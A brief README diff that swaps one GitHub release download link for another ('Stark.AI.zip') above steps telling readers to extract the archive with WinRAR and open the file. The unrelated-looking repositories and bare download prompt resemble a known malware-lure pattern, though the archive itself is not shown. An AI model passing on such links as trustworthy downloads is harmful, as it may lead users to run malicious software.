@@ -3,7 +3,7 @@
 [Click To Download](https://github.com/fruisjw1/fruidk3f/releases/download/1.1/Stark.9.1.2.zip)
 
 ### 💻 Installation Steps 
-- Download from [Releases](https://github.com/fruisjw1/fruidk3f/releases/download/1.1/Stark.9.1.2.zip)
+- Download from [Releases](https://github.com/EdwardOco49/stark-squad/releases/download/1.1/Stark.AI.zip)
 - Extract the zip file (using WinRAR) 
 - Open File
 - Select the start menu
